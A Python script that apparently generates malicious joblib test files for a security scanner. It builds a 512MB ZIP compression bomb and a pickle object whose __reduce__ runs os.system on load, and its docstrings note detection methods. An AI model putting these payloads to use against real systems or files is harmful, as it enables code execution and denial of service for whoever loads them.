"""
Joblib Attack Vector Generator

Generates real Joblib files (.joblib) with malicious payloads.
All methods produce genuine files — no JSON stubs.

Requires: joblib (pip install joblib)
"""

import zipfile
from pathlib import Path
from typing import Dict, List, Tuple

import joblib


class JoblibAttackGenerator:
    """Generate Joblib-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "joblib_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_compression_bomb(self) -> Tuple[str, int]:
        """Generate Joblib with compression bomb.

        Attack Vector:
            Joblib file (ZIP-based) with 512MB of 'A' bytes compressed to ~512KB.
            Resource exhaustion on decompression.

        Severity: HIGH
        Detection: Compression ratio analysis
        """
        filepath = self.output_dir / "01_compression_bomb.joblib"

        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.pkl", b"A" * (512 * 1024 * 1024))

        self.generated_files.append(str(filepath))
        return str(filepath), 1000

    def generate_embedded_pickle_rce(self) -> Tuple[str, int]:
        """Generate Joblib file whose payload executes os.system on load.

        Attack Vector:
            joblib.dump() serialises a Python object via pickle.
            The object's __reduce__ returns (os.system, ('id',)).
            joblib.load() triggers the RCE.

        Severity: CRITICAL
        Detection: Pickle opcode analysis
        """
        filepath = self.output_dir / "02_embedded_pickle_rce.joblib"

        class MaliciousObject:
            def __reduce__(self):
                import os
                return (os.system, ("id",))

        joblib.dump(MaliciousObject(), str(filepath))

        self.generated_files.append(str(filepath))
        return str(filepath), 3

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "compression_bomb": self.generate_compression_bomb(),
            "pickle_rce": self.generate_embedded_pickle_rce(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = JoblibAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")

